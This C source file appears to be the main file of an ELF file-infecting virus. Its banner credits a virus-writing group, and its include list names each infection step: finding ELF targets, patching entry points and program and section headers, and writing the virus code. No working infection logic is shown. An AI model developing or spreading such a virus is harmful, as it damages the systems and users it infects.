/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <elf.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <slang.h>

extern int errno;

#include "structs.h"
#include "open_target.h"
#include "map_file.h"
#include "is_elf.h"
#include "get_segment.h"
#include "infect_me.h"
#include "patch/patch_entry.h"
#include "patch/patch_phdr.h"
#include "patch/patch_shdr.h"
#include "open_dest.h"
#include "init_infection.h"
#include "write_infection.h"
#include "virus_code.c"
#include "close_file.h"
